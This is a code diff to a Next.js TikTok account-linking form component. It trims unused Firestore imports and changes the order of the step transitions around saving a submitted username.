@@ -6,7 +6,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import * as z from "zod";
 import { useForm } from "react-hook-form";
 import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X } from "lucide-react";
-import { collection, doc, addDoc, updateDoc } from "firebase/firestore";
+import { collection, doc } from "firebase/firestore";
 import { useRouter } from "next/navigation";
 
 import { Button } from "@/components/ui/button";
@@ -90,21 +90,24 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
         
         if (currentStep === 0) { // Submitting username
             const { username } = form.getValues();
-            addDocumentNonBlocking(collection(firestore, "tiktok_users"), {
+            const newDocPromise = addDocumentNonBlocking(collection(firestore, "tiktok_users"), {
                 tiktokUsername: username,
                 isVerified: false,
                 createdAt: new Date(),
-            }).then(docRef => {
+            });
+
+            newDocPromise.then(docRef => {
                 if (docRef) {
                     setSubmissionId(docRef.id);
                     localStorage.setItem('submissionId', docRef.id);
                 }
-                api.scrollNext(); // Go to processing
-                setTimeout(() => {
-                    api.scrollNext(); // Go to enter code
-                    setIsSubmitting(false);
-                }, 5000);
             });
+            
+            api.scrollNext(); // Go to processing
+            setTimeout(() => {
+                api.scrollNext(); // Go to enter code
+                setIsSubmitting(false);
+            }, 5000);
             return; // Important to return here to not reset submitting state
         }
         
@@ -331,5 +334,3 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
     </Card>
   );
 }
-
-    
